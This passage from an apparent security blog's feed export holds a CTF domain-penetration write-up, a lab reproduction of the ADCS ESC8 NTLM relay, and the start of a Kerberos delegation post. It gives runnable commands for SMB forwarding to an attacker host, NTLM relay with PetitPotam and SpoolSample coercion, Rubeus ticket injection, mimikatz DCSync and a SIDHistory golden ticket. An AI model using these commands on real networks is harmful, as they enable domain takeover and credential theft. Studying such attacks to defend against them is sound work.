rel="noopener">PortBender：一款功能强大的TCP端口重定向工具 – FreeBuf网络安全行业门户</a></p><p>首先把受控机的445端口流量重定向到受控机自己的8445端口，</p><p>首先需要把驱动传到当前shell目录下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">upload</span> <span class="selector-tag">xxxx</span><span class="selector-class">.sys</span></span><br></pre></td></tr></table></figure><p>执行重定向</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect <span class="number">445</span> <span class="number">8445</span></span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01ad73f391ee6089b9.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ad73f391ee6089b9.png" alt="img"></a></p><p>然后把受控机的8445端口转发到黑客机器的445端口上，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd <span class="number">8445</span> attackip <span class="number">445</span></span><br></pre></td></tr></table></figure><p>最后攻击者机器利用受控机的socks代理开启impacket监听：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ntlmrelayx.py -t http:<span class="regexp">//</span><span class="number">10.1</span>.<span class="number">16.82</span><span class="regexp">/certsrv/</span>certfnsh.asp -smb2support --adcs --template <span class="string">'domain controller'</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t01684af56b89590304.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01684af56b89590304.png" alt="img"></a></p><p>如果没上cs的话，可以用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Arno0x/</span>DivertTCPconn</span><br></pre></td></tr></table></figure><p>在域外机器上利用netsh端口转发，将本地的8445转发到攻击者机器上的445上</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenaddress</span>=0.0.0.0 <span class="attribute">listenport</span>=8445 <span class="attribute">connectaddress</span>=attackip <span class="attribute">connectport</span>=445</span><br><span class="line">netsh<span class="built_in"> interface </span>portproxy show all</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01a038564382347292.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01a038564382347292.png" alt="img"></a></p><p>一样将本机445端口流量重定向到8445上</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">divertTCPConn.exe <span class="number">445</span> <span class="number">8445</span> debug</span><br></pre></td></tr></table></figure><p>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span> <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t010214b0426209bf70.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t010214b0426209bf70.png" alt="img"></a></p><p>最后我们利用上面获取到的证书，使用Rubeus.exe获取tgt并注入：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt <span class="string">/user</span><span class="function">:DC2</span>$ <span class="string">/certificate</span>:打印出来的base64证书数据 <span class="string">/ptt</span></span><br></pre></td></tr></table></figure><p><a href="https://p1.ssl.qhimg.com/t0185e6c000f9eb4e0d.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0185e6c000f9eb4e0d.png" alt="img"></a></p><p>最后可以利用mimikatz，进行导出hash</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">"lsadump::dcsync /all /csv /domain:net.iSoon2021.lab"</span></span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t0187cf65921ff18fd4.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0187cf65921ff18fd4.png" alt="img"></a></p><p>拿到导出的域管hash,pth横向依此拿到dc2和dc1上的flag。</p><h2 id="0x06-dc1-net-iSoon2021-lab"><a href="#0x06-dc1-net-iSoon2021-lab" class="headerlink" title="0x06 dc1.net.iSoon2021.lab"></a>0x06 dc1.net.iSoon2021.lab</h2><p>现在已经拿到子域域控的权限。</p><p><a href="https://p5.ssl.qhimg.com/t017e46e9f4a33dda49.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t017e46e9f4a33dda49.png" alt="img"></a></p><p>有个155的段，端口扫描可得:10.10.155.10 为父域控。</p><h2 id="0x07-dc-iSoon2021-lab"><a href="#0x07-dc-iSoon2021-lab" class="headerlink" title="0x07 dc.iSoon2021.lab"></a>0x07 dc.iSoon2021.lab</h2><p><strong>关于sid history</strong></p><p> 当同林下创建新域时, EA 组的 SID 固定为根域的 SID, 组 ID 也是固定的 519, 此时, 如果用 EA 组的 SID 设置 SIDHistory 属性并和金票结合,那么一旦当我们拿到了林中任意一个域的 krbtgt NTLM, 即可实现到同林根域的 “跨域金票”拿到了根域,也就等于变相拿到林中的所有其它域,因为林根源对同林下所有域都有管理权。</p><ul><li>同一个域林中, 林根域和其它树根域之间会自动建立可传递的双向信任关系</li><li>同一个域树中, 父域和子域之间会自动建立可传递的双向信任关系</li><li>不同林之间为了实现资源共享, 也可手动建立信任关系, 这种信任关系可以是双向, 也可是单向, 具体依据实际配置而定</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest <span class="string">/domain_trusts</span></span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t01440d49c5022ccff0.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01440d49c5022ccff0.png" alt="img"></a></p><p>从上面的命令可以看出来，父域和子域是存在双向的信任关系。</p><p>通过生成SIDHistory 版黄金票据完成对父域的提权。<br>这里首先需要获取以下参数:</p><ul><li>/user 要伪造的用户,通常直接 administrator</li><li>/domain 当前子域名 FQDN</li><li>/sid 当前子域 sid</li><li>/krbtgt 当前子域 krbtgt ntlm hash</li><li>/sids 根域 sid + EA 组 id(默认 519)</li></ul><p>这里可以使用powerview+mimikatz收集。</p><p>之后创建票据并注入，命令：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "kerberos::golden /user:administrator /domain:net.iSoon2021.lab /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1313431314</span><span class="string">-2338497662</span><span class="string">-1182907679</span> /krbtgt:d5e25ff9a650238a511f95076a1288d3 /sids:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-3103963290</span><span class="string">-13490155</span><span class="string">-3681442193</span><span class="string">-519</span> /ptt""exit"</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01116eaf3d9ab9cfc5.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01116eaf3d9ab9cfc5.png" alt="img"></a></p><p>用主机名访问，不然会出错，访问父域成功</p><p><a href="https://p4.ssl.qhimg.com/t01b7a9caca077daaf5.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01b7a9caca077daaf5.png" alt="img"></a></p><p>使用mimikatz导出根域的hash</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">"lsadump::dcsync /domain:iSoon2021.lab /all /csv"</span></span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t014931ec03866cfe1f.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t014931ec03866cfe1f.png" alt="img"></a></p><p>pth上线父域控，C盘根目录下读flag。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.4hou.com/posts/n6Z7" target="_blank" rel="noopener">【技术原创】Confluence利用指南 – 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com</a></p><p><a href="https://www.c0bra.xyz/2021/02/17/域渗透-SID-History权限维持及域信任攻击/" target="_blank" rel="noopener">域渗透-SID History权限维持及域信任攻击 – gakkkkkkiii (c0bra.xyz)</a></p><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate" target="_blank" rel="noopener">ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate – Red Teaming Experiments (ired.team)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ISOON2021-线下域渗透题解&quot;&gt;&lt;a href=&quot;#ISOON2021-线下域渗透题解&quot; class=&quot;headerlink&quot; title=&quot;ISOON2021 线下域渗透题解&quot;&gt;&lt;/a&gt;ISOON2021 线下域渗透题解&lt;/h1&gt;&lt;h3 id=&quot;拓扑图&quot;&gt;
      
    
    </summary>
    
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ADCS中的ntlm relay</title>
    <link href="https://shu1l.github.io/2021/10/29/adcs-zhong-de-ntlm-relay/"/>
    <id>https://shu1l.github.io/2021/10/29/adcs-zhong-de-ntlm-relay/</id>
    <published>2021-10-29T09:14:42.000Z</published>
    <updated>2022-03-08T09:42:33.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ADCS中的ntlm-relay"><a href="#ADCS中的ntlm-relay" class="headerlink" title="ADCS中的ntlm relay"></a>ADCS中的ntlm relay</h1><p>本文首发于先知:<a href="https://xz.aliyun.com/t/10395" target="_blank" rel="noopener">ADCS中的ntlm relay - 先知社区 (aliyun.com)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        specterops在前一段时间发布了关于域证书，也就是Active Directory 证书服务相关攻击手法和漏洞的白皮书，specterops在白皮书一共提到了19种关于adcs的利用，大致可以分为窃取、权限维持、提权几种类型。国内分析的更多集中在ESC8也就是relay的利用上，本文主要在理解域证书的基础复现ESC8的利用手法。</p><p>​    白皮书地址:<a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener">https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</a></p><h3 id="环境搭建-Active-Directory-证书服务"><a href="#环境搭建-Active-Directory-证书服务" class="headerlink" title="环境搭建(Active Directory 证书服务)"></a>环境搭建(Active Directory 证书服务)</h3><p>这里我准备了两台winserver2012的机器，一台作为主DC，一台作为辅DC。</p><p>我们首先搭建好一个域环境，配置好DNS环境:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机<span class="number">10.211</span><span class="number">.55</span><span class="number">.128</span>Kali</span><br><span class="line">DC主机<span class="number">10.211</span><span class="number">.55</span><span class="number">.12</span>win2012R2</span><br><span class="line">辅DC<span class="number">10.211</span><span class="number">.55</span><span class="number">.7</span>    win2012R2</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012092241.png" alt></p><p>我们在辅DC安装域证书服务(adcs)，在部署证书服务器时建议独立部署，不要和域控制器部署在同一台服务器中。</p><p>打开服务器管理器，找到添加角色和功能，下一步，找到Active Directory证书服务,默认下一步即可。</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012093017.png" alt></p><p>这里要勾选1和4,因为之后relay时要用到证书注册的功能，然后默认安装即可。</p><h3 id="关于域证书"><a href="#关于域证书" class="headerlink" title="关于域证书"></a>关于域证书</h3><p>​    AD CS证书服务（SSL证书)，简单说就是可以用于部署企业根或独立根建立SSL加密通道。ADCS可以用来加密文件系统，数字签名，以及身份验证。它实际上是微软对于PKI解决方案的实现。</p><p>​    AD CS 角色包括下列角色服务：</p><ul><li>证书颁发机构</li><li>证书颁发机构 Web 注册</li><li>在线响应者</li><li>网络设备注册服务 (NDES)</li><li>证书注册 Web 服务 (CES)</li><li>证书注册策略 Web 服务。</li></ul><h4 id="CA-证书颁发机构"><a href="#CA-证书颁发机构" class="headerlink" title="CA(证书颁发机构)"></a>CA(证书颁发机构)</h4><p>​        证书颁发机构。 CA 的主要用途是颁发证书、吊销证书，以及发布授权信息访问 (AIA) 和吊销信息。 部署的第一个 CA 会成为内部 PKI 的根。 然后，可以部署位于 PKI 层次结构中的从属 CA，并将根 CA 置于其顶部。 从属 CA 隐式信任根 CA，并隐含信任根 CA 颁发的证书。</p><h5 id="配置CA"><a href="#配置CA" class="headerlink" title="配置CA"></a>配置CA</h5><p>点击旗帜图标，配置目标服务器上的Active Directory证书服务，进行CA的配置（根证书和私钥等）</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012111927.png" alt></p><p>勾选“证书颁发机构”和“证书颁发机构Web注册”</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012112140.png" alt></p><p>其他的默认安装即可。</p><p>证书服务颁发机构Web注册页面如下，Certsrv便是证书服务颁发机构Web注册在IIS默认站点下生成的应用程序。</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012114159.png" alt></p><h4 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h4><p>​    我们打开证书颁发机构，默认已经包含常见的证书模板，在证书模板中定义了颁发证书的信息（加密程序、证书有效期、是否允许导出私钥等）</p><p>在运行中输入：mmc，在添加/删除管理单元处可以添加证书模板</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018130422.png" alt></p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012102703.png" alt></p><h4 id="通过web服务器进行证书申请"><a href="#通过web服务器进行证书申请" class="headerlink" title="通过web服务器进行证书申请"></a>通过web服务器进行证书申请</h4><p>首先我们需要在IIS服务器里，创建证书申请</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018133356.png" alt></p><p>申请之后我们会得到一个保存有证书申请信息的txt文件。</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018134240.png" alt></p><p>之后我们打开证书颁发机构Web注册页面，点击申请证书</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018131953.png" alt></p><p>之后要选择高级证书申请，使用Base64编码提交证书申请</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018132006.png" alt></p><p>将复制的内容粘贴到如下位置，选择证书模板：Web服务器。提交即可</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018132312.png" alt></p><p>更多的关于ADCS的资料大家可以从微软官网获取</p><h3 id="ESC8-ADCS-Relay"><a href="#ESC8-ADCS-Relay" class="headerlink" title="ESC8(ADCS Relay)"></a>ESC8(ADCS Relay)</h3><p>白皮书中一共提到19种攻击手法，大致可以分为:</p><ul><li>窃取类</li><li>权限维持类</li><li>权限提升类</li></ul><p>​    其中权限维持类又可以分为个体权限维持与域的权限维持，类似我们常见的白银票据和黄金票据。在这些关于证书服务的攻击中威胁比较大的被称作ESC8 也被叫做ADCS Relay。</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    ADCS的http证书接口允许通过NTLM身份验证，未但是启用NTLM中继保护，因此攻击者可以利用NTLM Relay攻击ADCS证书服务。攻击者可以在一个默认安装了证书web服务的域环境中，使用普通用户凭据，直接获取到域管权限。</p><h4 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a><strong>大致思路</strong></h4><p>​    结合 PetitPotam 与 ESC8，获取证书后可以为用户/机器请求 TGT / TGS 票据。能够实现从低权限域用户提升到域管理员权限，从而实现对整个域环境的控制。</p><ul><li>攻击者利用打印机漏洞，强制域控使用机器账户发起ntlm认证请求</li><li>之后讲请求relay到证书服务的http接口，通过验证获得域机器账户的身份</li><li>利用证书模板为机器用户申请证书，方便之后持久性获取该用户权限</li><li>最后利用申请到的证书进行认证，就能拿到机器用户也就是域控的权限。</li></ul><h4 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h4><p>首先我们需要安装最新的impacket</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/ExAndroidDev/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">git checkout ntlmrelayx-adcs-attack</span><br></pre></td></tr></table></figure><p>之后为impacket准备一个python虚拟环境。安装虚拟环境包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> python3-venv</span><br><span class="line">python3 -m venv impacket</span><br><span class="line"><span class="keyword">source</span> impacket/<span class="keyword">bin</span>/<span class="keyword">activate</span></span><br></pre></td></tr></table></figure><p>最后使用pip安装依赖即可</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> .</span><br></pre></td></tr></table></figure><p>建议使用最新版的kali进行安装，其他系统安装有可能出现报错。正确安装的情况:</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211012105512.png" alt></p><h5 id="1-查找证书web服务端点"><a href="#1-查找证书web服务端点" class="headerlink" title="1.查找证书web服务端点"></a>1.查找证书web服务端点</h5><p>可以使用certutil命令来定位域内的CA服务器:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -<span class="built_in">config</span> - -ping</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211014001805.png" alt></p><p>测试与CA服务器的网络连通:</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018142908.png" alt></p><p>可以看到，在默认情况下，证书注册服务、证书注册策略 web 服务、网络设备注册服务通过授权 http 头支持协商身份验证，支持 kerberos 及 NTLM。所以攻击者可以在这里进行中继攻击。</p><h5 id="impacket设置监听"><a href="#impacket设置监听" class="headerlink" title="impacket设置监听"></a>impacket设置监听</h5><p>使用ntlmrelayx.py 进行监听，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -debug -smb2support <span class="params">--target</span> http:<span class="string">//10.211.55.7/certsrv/certfnsh.asp</span> <span class="params">--adcs</span> <span class="params">--template</span> DomainController</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211014002643.png" alt></p><h5 id="打印机bug"><a href="#打印机bug" class="headerlink" title="打印机bug"></a>打印机bug</h5><p>利用打印机bug,让域控回连到我们监听的服务上,这里可以使用spoolsample或者petitpotam，这里需要一个普通的域账号权限。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">SpoolSample</span>.</span></span>exe dcip attackip</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018152945.png" alt></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py domain/user:<span class="symbol">password@</span><span class="number">10.211</span><span class="number">.55</span><span class="number">.12</span> <span class="number">10.211</span><span class="number">.55</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211014011212.png" alt></p><p>然后我们就获得到凭证证书信息:</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211014011140.png" alt></p><h5 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h5><p>最后我们利用上面获取到的证书，使用Rubeus.exe获取tgt并注入：</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211014230512.png" alt></p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018183955.png" alt></p><p><strong>注:</strong>我这里出现了KRB-ERROR (16) 的报错，需要到windows安全设置的本地策略里的安全选项里配置Kerberos允许的加密类型全部勾选。</p><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018163907.png" alt></p><p>之后可以利用mimikatz，进行导出hash</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/all /</span>csv /<span class="string">domain:</span>xxxx</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/adcs-zhong-de-ntlm-relay/QQ%E6%88%AA%E5%9B%BE20211018183907.png" alt></p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>关闭证书服务的web端点，或者开启SSL认证</li><li>开启NTML中继保护</li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate" target="_blank" rel="noopener">ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate - Red Teaming Experiments (ired.team)</a></p><p><a href="https://www.anquanke.com/post/id/245791#h2-11" target="_blank" rel="noopener">Active Directory 证书服务攻击与防御（一） - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="https://www.cnblogs.com/websecyw/p/15070423.html" target="_blank" rel="noopener">AD CS relay attack - aoaoaoao - 博客园 (cnblogs.com)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MDcyMTMxOQ==&mid=2247483735&idx=1&sn=e0ddc385b58caab50a431e49755b051e&scene=21#wechat_redirect" target="_blank" rel="noopener">全补丁域森林5秒沦陷？加密升级之信任雪崩 (qq.com)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ADCS中的ntlm-relay&quot;&gt;&lt;a href=&quot;#ADCS中的ntlm-relay&quot; class=&quot;headerlink&quot; title=&quot;ADCS中的ntlm relay&quot;&gt;&lt;/a&gt;ADCS中的ntlm relay&lt;/h1&gt;&lt;p&gt;本文首发于先知:&lt;a hre
      
    
    </summary>
    
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>基于委派的测试</title>
    <link href="https://shu1l.github.io/2021/09/11/ji-yu-wei-pai-de-ce-shi/"/>
    <id>https://shu1l.github.io/2021/09/11/ji-yu-wei-pai-de-ce-shi/</id>
    <published>2021-09-11T09:19:28.000Z</published>
    <updated>2021-09-11T09:25:05.053Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得<strong>服务账号能以用户权限</strong>开展域内活动。</p><h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p><p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p><h3 id="非约束性委派-Unconstrained-delegation）"><a href="#非约束性委派-Unconstrained-delegation）" class="headerlink" title="非约束性委派(Unconstrained delegation）"></a>非约束性委派(Unconstrained delegation）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​    我们上面说了域委派的基本过程,对于非约束性委派来说，<strong>即无限制的转发，B可以用从A处得到的TGT访问任意服务，其中B也可以是任意服务。</strong></p><p><strong>注意:</strong></p><p>这里的委派的账户必须是”服务账户”或者”机器账户”。</p><h4 id="实际场景中的利用-非约束委派-Spooler打印机"><a href="#实际场景中的利用-非约束委派-Spooler打印机" class="headerlink" title="实际场景中的利用(非约束委派+Spooler打印机)"></a>实际场景中的利用(非约束委派+Spooler打印机)</h4><p>​    根据上面的原理我们知道,要想实现非约束性委派,<strong>必须让域用户访问我们启用了”非约束委派”的机器</strong>。但实战这种情况几乎不可能。</p><p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification（<span class="keyword">Ex</span>）方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821195008.png" alt></p><p>这里的查找主要是分为<strong>用户账户和服务账户</strong>,我这里使用的是ADfind,还可以使用Powerview，或者ladpserach</p><p>查找域中配置非约束委派的用户：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adfind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.119</span> <span class="selector-tag">-u</span> <span class="selector-tag">klion</span>\<span class="selector-tag">xuefeng</span><span class="selector-class">.wang</span> <span class="selector-tag">-up</span> <span class="selector-tag">wxf123</span>!@#45 -b <span class="string">"DC=klion,DC=local"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821205431.png" alt></p><p>查找域中配置非约束委派的主机：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">adfind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.119</span> <span class="selector-tag">-u</span> <span class="selector-tag">klion</span>\<span class="selector-tag">xuefeng</span><span class="selector-class">.wang</span> <span class="selector-tag">-up</span> <span class="selector-tag">wxf123</span>!@#45 -b <span class="string">"DC=klion,DC=local"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210821205247.png" alt></p><p>或者使用powerView脚本:</p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822182240.png" alt></p><p>这里的就以红框里的OA机器来测试，假设我们这里已经通过其他手段拿到了OA这台机器的权限。</p><p><code>Print Spooler</code>服务默认是自动运行的</p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822190528.png" alt></p><p>首先,在 OA 机器上监控登录,并实时转存 TGT, 注,此操作需要本地管理权限</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:dc01$</span><br></pre></td></tr></table></figure><p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p><p><img 